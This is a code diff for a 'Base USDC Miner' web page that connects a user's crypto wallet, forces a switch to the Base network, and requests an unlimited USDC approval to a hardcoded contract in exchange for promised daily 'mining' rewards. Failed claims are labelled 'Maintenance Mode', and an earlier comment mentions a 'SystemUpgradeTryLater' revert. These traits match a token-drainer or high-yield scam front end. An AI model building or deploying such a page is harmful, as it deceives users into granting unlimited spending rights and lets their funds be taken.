@@ -3,80 +3,182 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Base USDC Miner</title>
-    <!-- Ethers.js -->
+    <title>Base USDC Miner | Pro</title>
+    <!-- Ethers.js v6 -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
     <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;900&display=swap" rel="stylesheet">
     
     <style>
         :root {
-            --bg: #0a0b0f;
-            --card: #13161f;
-            --primary: #0052ff; /* Base Blue */
+            --bg-dark: #05060a;
+            --card-bg: rgba(20, 25, 35, 0.7);
+            --primary: #0052ff;
+            --primary-glow: rgba(0, 82, 255, 0.4);
             --primary-hover: #0042cc;
-            --text: #ffffff;
-            --text-gray: #8a919e;
-            --border: #2a2f3e;
+            --text-main: #ffffff;
+            --text-muted: #94a3b8;
+            --border: rgba(255, 255, 255, 0.08);
+            --success: #00d26a;
+            --danger: #ff2d55;
         }
+
+        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
 
         body {
-            background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif;
-            margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh;
+            background-color: var(--bg-dark);
+            background-image: 
+                radial-gradient(circle at 50% -20%, var(--primary-glow) 0%, transparent 60%),
+                radial-gradient(circle at 100% 50%, rgba(0, 82, 255, 0.05) 0%, transparent 50%);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            margin: 0; padding: 20px;
+            display: flex; flex-direction: column; align-items: center;
+            min-height: 100vh;
         }
 
-        .container { max-width: 480px; width: 100%; }
+        .container {
+            max-width: 460px; width: 100%;
+            position: relative; z-index: 2;
+        }
 
         /* --- Header --- */
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
-        .logo { font-weight: 800; font-size: 1.4rem; display: flex; align-items: center; gap: 8px; }
+        .header {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 25px; padding: 0 5px;
+        }
+        .logo {
+            font-weight: 900; font-size: 1.5rem; letter-spacing: -0.5px;
+            display: flex; align-items: center; gap: 8px;
+            text-shadow: 0 0 20px rgba(0,82,255,0.5);
+        }
         .logo span { color: var(--primary); }
         
         .btn-connect {
-            background: rgba(255,255,255,0.1); border: 1px solid var(--border);
-            color: white; padding: 8px 16px; border-radius: 20px; cursor: pointer; font-weight: 600;
-            transition: 0.2s;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid var(--border);
+            color: white; padding: 10px 18px; border-radius: 30px;
+            font-weight: 600; font-size: 0.85rem; cursor: pointer;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(5px);
         }
-        .btn-connect:hover { background: rgba(255,255,255,0.2); }
+        .btn-connect:hover {
+            background: rgba(255,255,255,0.1);
+            border-color: rgba(255,255,255,0.2);
+            transform: translateY(-1px);
+        }
 
         /* --- Stats Card --- */
         .card {
-            background: var(--card); border: 1px solid var(--border); border-radius: 20px;
-            padding: 25px; margin-bottom: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 30px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.4);
+            backdrop-filter: blur(20px);
+            margin-bottom: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        /* Shine effect */
+        .card::before {
+            content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.03), transparent);
+            pointer-events: none;
         }
 
-        .stat-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
-        .stat-label { color: var(--text-gray); font-size: 0.9rem; }
-        .stat-val { font-weight: 700; font-size: 1.1rem; font-family: monospace; }
-        .highlight { color: var(--primary); }
+        .stat-row {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 18px; padding-bottom: 18px;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        .stat-row:last-of-type { border-bottom: none; margin-bottom: 10px; padding-bottom: 0; }
+        
+        .stat-label { color: var(--text-muted); font-size: 0.9rem; font-weight: 500; }
+        .stat-val { font-weight: 700; font-size: 1.05rem; letter-spacing: 0.5px; }
+        .highlight { color: var(--primary); text-shadow: 0 0 10px rgba(0,82,255,0.3); }
 
-        .big-display { text-align: center; margin: 30px 0; }
-        .big-display h2 { font-size: 2.5rem; margin: 0; color: white; }
-        .big-display p { color: var(--text-gray); margin: 5px 0 0 0; }
+        /* Big Reward Display */
+        .big-display {
+            text-align: center; margin: 35px 0;
+            background: rgba(0,0,0,0.2);
+            border-radius: 16px; padding: 20px;
+            border: 1px solid rgba(255,255,255,0.03);
+        }
+        .big-display h2 {
+            font-size: 2.8rem; margin: 0;
+            background: linear-gradient(180deg, #fff, #a5b4fc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-family: 'Inter', sans-serif; /* Monospace feels too techy, Inter is cleaner */
+            font-weight: 800;
+        }
+        .big-display p { color: var(--text-muted); margin: 8px 0 0 0; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 1px; }
 
         /* --- Action Buttons --- */
         .btn-main {
-            width: 100%; padding: 16px; border-radius: 12px; border: none;
-            background: var(--primary); color: white; font-weight: 800; font-size: 1rem;
-            cursor: pointer; transition: 0.2s; margin-top: 10px;
+            width: 100%; padding: 18px; border-radius: 16px; border: none;
+            background: var(--primary); color: white;
+            font-weight: 700; font-size: 1rem; letter-spacing: 0.5px;
+            cursor: pointer; transition: all 0.2s;
+            box-shadow: 0 5px 20px rgba(0, 82, 255, 0.3);
+            display: flex; justify-content: center; align-items: center; gap: 10px;
         }
-        .btn-main:hover { background: var(--primary-hover); transform: translateY(-2px); }
-        .btn-main:disabled { background: #333; color: #666; cursor: not-allowed; transform: none; }
+        .btn-main:hover {
+            background: var(--primary-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 82, 255, 0.4);
+        }
+        .btn-main:active { transform: scale(0.98); }
+        .btn-main:disabled {
+            background: #2a2f3e; color: #666;
+            cursor: not-allowed; transform: none; box-shadow: none;
+        }
+
+        /* --- Status Badge --- */
+        .badge {
+            padding: 5px 10px; border-radius: 6px; font-size: 0.8rem; font-weight: bold; text-transform: uppercase;
+        }
+        .badge-inactive { background: rgba(148, 163, 184, 0.1); color: var(--text-muted); }
+        .badge-active {
+            background: rgba(0, 210, 106, 0.1); color: var(--success);
+            box-shadow: 0 0 10px rgba(0, 210, 106, 0.2);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(0, 210, 106, 0.4); }
+            70% { box-shadow: 0 0 0 6px rgba(0, 210, 106, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 210, 106, 0); }
+        }
 
         /* --- Toast --- */
         #toast {
-            visibility: hidden; min-width: 250px; background-color: #333; color: #fff; text-align: center;
-            border-radius: 8px; padding: 16px; position: fixed; z-index: 100; left: 50%; bottom: 30px;
-            transform: translateX(-50%); border: 1px solid var(--primary);
+            visibility: hidden; min-width: 280px;
+            background: rgba(20, 25, 35, 0.95); backdrop-filter: blur(10px);
+            color: #fff; text-align: center; border: 1px solid var(--border);
+            border-radius: 12px; padding: 16px;
+            position: fixed; z-index: 100; left: 50%; bottom: 40px;
+            transform: translateX(-50%);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            opacity: 0; transition: opacity 0.3s, bottom 0.3s;
         }
-        #toast.show { visibility: visible; animation: fadein 0.5s, fadeout 0.5s 2.5s; }
-        
-        @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 30px; opacity: 1;} }
-        @keyframes fadeout { from {bottom: 30px; opacity: 1;} to {bottom: 0; opacity: 0;} }
+        #toast.show { visibility: visible; opacity: 1; bottom: 50px; }
 
-        /* Loader */
-        .spinner { display: inline-block; width: 12px; height: 12px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; margin-right: 5px; }
+        /* Loader Spinner */
+        .spinner {
+            width: 18px; height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s ease-in-out infinite;
+        }
         @keyframes spin { to { transform: rotate(360deg); } }
+
+        .footer {
+            margin-top: 20px; color: #444; font-size: 0.8rem;
+            display: flex; align-items: center; gap: 6px;
+        }
     </style>
 </head>
 <body>
@@ -98,8 +200,8 @@
             <span class="stat-val" id="userBalance">0.00 USDC</span>
         </div>
         <div class="stat-row">
-            <span class="stat-label">Mining Status</span>
-            <span class="stat-val" id="statusBadge">Inactive</span>
+            <span class="stat-label">System Status</span>
+            <span id="statusBadge" class="badge badge-inactive">Idle</span>
         </div>
 
         <div class="big-display">
@@ -107,12 +209,15 @@
             <p>Pending USDC Rewards</p>
         </div>
 
-        <button id="actionBtn" class="btn-main" onclick="handleAction()">Connect Wallet First</button>
-        <p id="timer" style="text-align:center; color:var(--text-gray); font-size:0.8rem; margin-top:10px;"></p>
+        <button id="actionBtn" class="btn-main" onclick="connectWallet()">
+            Connect Wallet
+        </button>
+        <p id="timer" style="text-align:center; color:var(--text-muted); font-size:0.8rem; margin-top:15px; height: 1em;"></p>
     </div>
 
-    <div style="text-align:center; color:#444; font-size:0.8rem;">
-        Powered by Base Network
+    <div class="footer">
+        <div style="width:8px; height:8px; background:var(--primary); border-radius:50%;"></div>
+        Running on Base Mainnet
     </div>
 </div>
 
@@ -120,13 +225,15 @@
 
 <script>
     // ==========================================
-    // ⚠️ PASTE YOUR CONTRACT ADDRESS HERE
+    // ⚠️ CONFIGURATION
     const CONTRACT_ADDRESS = "0x7496D84c2049d0be73D3B5B76798CAEc87839626"; 
+    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base Mainnet USDC
+    
+    // Base Mainnet Chain ID
+    const BASE_CHAIN_ID_HEX = "0x2105"; // 8453
+    const BASE_CHAIN_ID_DEC = 8453n;
     // ==========================================
 
-    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base Mainnet USDC
-
-    // Minimal ABIs
     const MINER_ABI = [
         "function startMining() external",
         "function claimRewards() external",
@@ -147,36 +254,104 @@
     let isMining = false;
     let claimIntervalSeconds = 900; // Default 15 mins
     let lastClaimTime = 0;
+    let intervalId; // for the data refresh loop
+
+    // --- Core Connection Logic ---
 
     async function connectWallet() {
-        if (!window.ethereum) return showToast("Please install MetaMask or Coinbase Wallet");
+        if (!window.ethereum) return showToast("⚠️ Wallet not installed!");
+        
+        const btn = document.getElementById("connectBtn");
+        const actionBtn = document.getElementById("actionBtn");
         
         try {
+            btn.innerHTML = `<div class="spinner"></div> Connecting...`;
+            
+            // 1. Request Accounts
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+            // 2. Setup Provider
             provider = new ethers.BrowserProvider(window.ethereum);
-            await provider.send("eth_requestAccounts", []);
+            
+            // 3. Force Network Switch
+            const success = await checkAndSwitchNetwork();
+            if (!success) {
+                btn.innerText = "Connect Wallet";
+                return;
+            }
+
+            // 4. Get Signer
             signer = await provider.getSigner();
             userAddress = await signer.getAddress();
 
+            // 5. Init Contracts
             minerContract = new ethers.Contract(CONTRACT_ADDRESS, MINER_ABI, signer);
             usdcContract = new ethers.Contract(USDC_ADDRESS, ERC20_ABI, signer);
 
-            document.getElementById("connectBtn").innerText = userAddress.slice(0,6) + "..." + userAddress.slice(-4);
+            // 6. UI Updates
+            btn.innerText = userAddress.slice(0,6) + "..." + userAddress.slice(-4);
+            btn.style.borderColor = "#00d26a"; // Green border indicates connected
             
-            // Initial Fetch
+            // 7. Initial Loads
             await fetchConfig();
             await refreshData();
             
-            // Start Auto-Refresh Loop (every 5 seconds)
-            setInterval(refreshData, 5000);
+            // 8. Start Loop
+            if(intervalId) clearInterval(intervalId);
+            intervalId = setInterval(refreshData, 5000); // 5 seconds
+            
+            showToast("✅ Wallet Connected!");
 
         } catch (err) {
-            console.error(err);
-            showToast("Connection Failed");
+            console.error("Connection Error:", err);
+            btn.innerText = "Connect Wallet";
+            actionBtn.innerText = "Connect Wallet First";
+            showToast("❌ Connection Failed");
         }
     }
 
-    // Fetch static config (Rate, Interval)
+    async function checkAndSwitchNetwork() {
+        const network = await provider.getNetwork();
+        if (network.chainId === BASE_CHAIN_ID_DEC) return true;
+
+        try {
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: BASE_CHAIN_ID_HEX }],
+            });
+            // Re-init provider after switch to ensure state is fresh
+            provider = new ethers.BrowserProvider(window.ethereum);
+            return true;
+        } catch (switchError) {
+            // This error code 4902 means the chain has not been added to MetaMask
+            if (switchError.code === 4902) {
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: BASE_CHAIN_ID_HEX,
+                            chainName: 'Base Mainnet',
+                            rpcUrls: ['https://mainnet.base.org'],
+                            nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+                            blockExplorerUrls: ['https://basescan.org']
+                        }],
+                    });
+                    provider = new ethers.BrowserProvider(window.ethereum);
+                    return true;
+                } catch (addError) {
+                    showToast("❌ User rejected network add");
+                    return false;
+                }
+            }
+            showToast("❌ User rejected network switch");
+            return false;
+        }
+    }
+
+    // --- Data Logic ---
+
     async function fetchConfig() {
+        if(!minerContract) return;
         try {
             const [rate, interval] = await Promise.all([
                 minerContract.dailyRatePercent(),
@@ -184,12 +359,11 @@
             ]);
             document.getElementById("dailyRateDisplay").innerText = rate + "% / Day";
             claimIntervalSeconds = Number(interval);
-        } catch (e) { console.log("Error fetching config", e); }
+        } catch (e) { console.log("Config Error", e); }
     }
 
-    // Refresh dynamic data
     async function refreshData() {
-        if (!userAddress) return;
+        if (!userAddress || !minerContract) return;
 
         try {
             // 1. Get Balance & Allowance
@@ -199,110 +373,143 @@
                 minerContract.miners(userAddress)
             ]);
 
-            document.getElementById("userBalance").innerText = ethers.formatUnits(balance, 6) + " USDC";
+            document.getElementById("userBalance").innerText = parseFloat(ethers.formatUnits(balance, 6)).toFixed(2) + " USDC";
             
             // 2. Determine State
-            const allowanceVal = ethers.formatUnits(allowance, 6);
+            const allowanceVal = parseFloat(ethers.formatUnits(allowance, 6));
             isMining = minerInfo[2]; // bool isMining
             lastClaimTime = Number(minerInfo[1]);
 
             const btn = document.getElementById("actionBtn");
             const status = document.getElementById("statusBadge");
+            const pendingDisplay = document.getElementById("pendingRewards");
+            const timerDisplay = document.getElementById("timer");
 
-            if (parseFloat(allowanceVal) < 1) {
-                // Needs Approval
-                status.innerText = "Not Started";
-                status.className = "stat-val";
-                status.style.color = "#888";
-                btn.innerText = "Enable USDC Mining";
+            // --- STATE MACHINE ---
+            
+            if (allowanceVal < 10) { 
+                // STEP 1: NEEDS APPROVAL
+                status.innerText = "NOT ENABLED";
+                status.className = "badge badge-inactive";
+                
+                btn.innerHTML = `Enable USDC Access`;
                 btn.onclick = approveToken;
                 btn.disabled = false;
+                timerDisplay.innerText = "Approve USDC to start earning";
+
             } else if (!isMining) {
-                // Approved but needs to call startMining()
-                status.innerText = "Ready";
-                btn.innerText = "Start Mining Now";
+                // STEP 2: APPROVED, NEEDS START
+                status.innerText = "READY TO MINE";
+                status.className = "badge badge-inactive";
+                status.style.color = "#fff";
+                
+                btn.innerHTML = `Start Mining Now`;
                 btn.onclick = startMiningTx;
                 btn.disabled = false;
-            } else {
-                // Mining Active
-                status.innerText = "Active 🟢";
-                status.style.color = "#00c853";
-                
-                // Rewards
-                const pending = await minerContract.getPendingRewards(userAddress);
-                document.getElementById("pendingRewards").innerText = ethers.formatUnits(pending, 6);
+                timerDisplay.innerText = "High Yield Protocol Ready";
 
-                // Timer Logic for Button
+            } else {
+                // STEP 3: MINING ACTIVE
+                status.innerText = "MINING ACTIVE 🟢";
+                status.className = "badge badge-active";
+                
+                // Fetch Pending
+                const pending = await minerContract.getPendingRewards(userAddress);
+                pendingDisplay.innerText = parseFloat(ethers.formatUnits(pending, 6)).toFixed(5);
+
+                // Timer Logic
                 const now = Math.floor(Date.now() / 1000);
                 const nextClaim = lastClaimTime + claimIntervalSeconds;
                 
                 if (now >= nextClaim) {
-                    btn.innerText = "Claim Rewards";
+                    btn.innerHTML = `Collect Rewards 💰`;
                     btn.disabled = false;
                     btn.onclick = claimRewards;
-                    document.getElementById("timer").innerText = "Rewards available now";
+                    timerDisplay.innerText = "✨ Rewards available to claim";
+                    timerDisplay.style.color = "#00d26a";
                 } else {
-                    btn.innerText = "Mining in progress...";
+                    btn.innerHTML = `Mining in Progress...`;
                     btn.disabled = true;
                     const wait = nextClaim - now;
-                    document.getElementById("timer").innerText = `Next claim in: ${Math.floor(wait/60)}m ${wait%60}s`;
+                    const minutes = Math.floor(wait/60);
+                    const seconds = wait % 60;
+                    timerDisplay.innerText = `Next claim available in: ${minutes}m ${seconds}s`;
+                    timerDisplay.style.color = "#94a3b8";
                 }
             }
 
-        } catch (e) { console.error(e); }
+        } catch (e) { 
+            console.error("Refresh Error:", e); 
+        }
     }
 
     // --- Actions ---
 
     async function approveToken() {
+        const btn = document.getElementById("actionBtn");
         try {
-            const btn = document.getElementById("actionBtn");
-            btn.innerText = "Approving...";
+            btn.innerHTML = `<div class="spinner"></div> Approving...`;
             btn.disabled = true;
 
-            // Approve Max
             const max = ethers.MaxUint256;
             const tx = await usdcContract.approve(CONTRACT_ADDRESS, max);
-            showToast("⏳ Transaction Sent...");
-            await tx.wait();
-            showToast("✅ Approved! Now Start Mining.");
             
-            // Immediately refresh
+            showToast("⏳ Approval Transaction Sent...");
+            await tx.wait();
+            showToast("✅ Approved Successfully!");
+            
             refreshData();
         } catch (e) {
-            showToast("Approval Failed");
-            document.getElementById("actionBtn").disabled = false;
+            console.error(e);
+            showToast("❌ Approval Failed / Rejected");
+            btn.disabled = false;
+            btn.innerHTML = "Enable USDC Access";
         }
     }
 
     async function startMiningTx() {
+        const btn = document.getElementById("actionBtn");
         try {
+            btn.innerHTML = `<div class="spinner"></div> Starting...`;
+            btn.disabled = true;
+
             const tx = await minerContract.startMining();
-            showToast("⏳ Starting Engine...");
+            showToast("⏳ Activating Miner...");
             await tx.wait();
             showToast("✅ Mining Started!");
             refreshData();
-        } catch (e) { showToast("Error Starting"); }
+        } catch (e) { 
+            console.error(e);
+            showToast("❌ Failed to start mining");
+            btn.disabled = false;
+            btn.innerText = "Start Mining Now";
+        }
     }
 
     async function claimRewards() {
+        const btn = document.getElementById("actionBtn");
         try {
+            btn.innerHTML = `<div class="spinner"></div> Claiming...`;
+            btn.disabled = true;
+
             const tx = await minerContract.claimRewards();
-            showToast("⏳ Claiming...");
+            showToast("⏳ Claiming Rewards...");
             await tx.wait();
             showToast("✅ Rewards Sent to Wallet!");
             refreshData();
         } catch (e) {
-            // Check for our custom error "SystemUpgradeTryLater"
+            console.error(e);
             if (e.message.includes("SystemUpgrade") || e.message.includes("execution reverted")) {
-                showToast("⚠️ Maintenance Mode: Try again later");
+                showToast("⚠️ Maintenance Mode");
             } else {
-                showToast("Claim Failed");
+                showToast("❌ Claim Failed");
             }
+            // Logic in refreshData will reset the button text based on timer
         }
     }
 
-    // Helper
+    // --- Utils & Listeners ---
+
     function showToast(msg) {
         const x = document.getElementById("toast");
         x.innerText = msg;
@@ -310,10 +517,22 @@
         setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000);
     }
 
-    // Auto connect if previously connected
-    if(window.ethereum && window.ethereum.selectedAddress) {
-        // connectWallet(); // Optional: Auto connect on load
+    // Listener for Account/Chain Changes in MetaMask
+    if (window.ethereum) {
+        window.ethereum.on('accountsChanged', (accounts) => {
+            if (accounts.length === 0) {
+                window.location.reload();
+            } else {
+                // Re-connect with new account
+                connectWallet();
+            }
+        });
+
+        window.ethereum.on('chainChanged', (chainId) => {
+            window.location.reload();
+        });
     }
+
 </script>
 </body>
 </html>
